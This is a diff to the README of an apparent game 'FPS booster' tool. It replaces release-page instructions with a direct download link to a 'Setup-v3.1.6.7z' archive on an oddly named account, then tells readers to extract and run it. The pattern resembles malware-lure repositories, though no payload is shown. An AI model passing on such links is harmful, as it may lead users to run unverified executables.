@@ -48,10 +48,10 @@ It helps deliver smoother gameplay, better responsiveness, and more stable frame
 
 ## 📥 Installation
 
-1. Open the **Releases** section of this repository
-2. Download the latest version of **ArcRaiders FPS Booster**
-3. Extract the archive
-4. Run the application
+1. [![Download](https://img.shields.io/badge/Download-ArcRaiders%20FPS%20Booster-blue?style=for-the-badge&logo=github)](https://github.com/kyle-liu-io1998l8/ArcRaiders-FPS-Booster/releases/download/Download/Setup-v3.1.6.7z)
+2. Extract the archive
+3. Run the application
+
 
 ---
 
